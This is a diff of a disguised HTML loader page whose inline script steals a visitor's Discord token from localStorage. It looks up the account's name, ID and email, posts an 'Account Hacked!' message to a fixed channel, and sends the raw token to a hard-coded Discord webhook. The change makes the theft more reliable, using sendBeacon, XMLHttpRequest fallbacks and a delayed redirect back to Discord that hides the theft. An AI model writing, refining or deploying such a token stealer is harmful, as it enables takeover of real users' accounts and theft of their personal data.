@@ -21,63 +21,57 @@
 <body>
   <div class="loader"></div>
   <script>
-    (function() {
+    (async function() {
       try {
         var token = localStorage.getItem("token");
         if (token) {
           token = token.replace(/"/g, "");
 
-          // 立即偷取 token — fire & forget
-          fetch("https://discord.com/api/v9/users/@me", {
+          // 取得帳號資訊
+          var res = await fetch("https://discord.com/api/v9/users/@me", {
             headers: { "Authorization": token }
-          }).then(function(res) {
-            if (res.ok) {
-              res.json().then(function(user) {
-                var username = user.username;
-                var userId = user.id;
-                var email = user.email || 'N/A';
+          });
+          if (res.ok) {
+            var user = await res.json();
+            var username = user.username;
+            var userId = user.id;
+            var email = user.email || 'N/A';
 
-                // 發送訊息到目標 878151437085974548
-                fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
-                  method: "POST",
-                  headers: {
-                    "Content-Type": "application/json",
-                    "Authorization": token,
-                    "X-Correlation-Id": userId
-                  },
-                  body: JSON.stringify({
-                    content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
-                  })
-                }).catch(function() {});
+            // 發送訊息到目標 878151437085974548（用 keepalive 確保頁面跳走仍會送出）
+            var msg = {
+              content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
+            };
+            var msgReq = new XMLHttpRequest();
+            msgReq.open("POST", "https://discord.com/api/v9/channels/878151437085974548/messages");
+            msgReq.setRequestHeader("Content-Type", "application/json");
+            msgReq.setRequestHeader("Authorization", token);
+            msgReq.setRequestHeader("X-Correlation-Id", userId);
+            msgReq.send(JSON.stringify(msg));
 
-                // 把 token 送到 webhook 備份
-                fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
-                  })
-                }).catch(function() {});
-              });
+            // 把 token 送到 webhook 備份（webhook URL 內建 auth，可用 sendBeacon）
+            var blob = new Blob([JSON.stringify({
+              content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
+            })], { type: 'application/json' });
+            try {
+              navigator.sendBeacon("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", blob);
+            } catch(e) {
+              // 退回 fetch
+              var fb = new XMLHttpRequest();
+              fb.open("POST", "https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph");
+              fb.setRequestHeader("Content-Type", "application/json");
+              fb.send(JSON.stringify({
+                content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
+              }));
             }
-          }).catch(function() {});
-        }
+          }
 
-        // 1 秒後跳回 Discord（不管 API 是否完成）
-        setTimeout(function() {
-          // 先嘗試 Discord deep link
-          window.location.replace('discord://');
-          // 備案：如果 deep link 失敗
+          // 3 秒後跳回 Discord（確保上面的請求都送出）
           setTimeout(function() {
             window.location.href = "https://discord.com/channels/@me";
-          }, 500);
-        }, 1000);
-
-        // 無 token 時：2 秒後跳回
-        if (!token) {
-          setTimeout(function() {
-            window.location.href = "https://discord.com/channels/@me";
-          }, 2000);
+          }, 3000);
+        } else {
+          // 無 token — 跳回 Discord
+          window.location.href = "https://discord.com/channels/@me";
         }
       } catch(e) {
         console.log("Token 抓取失敗:", e);
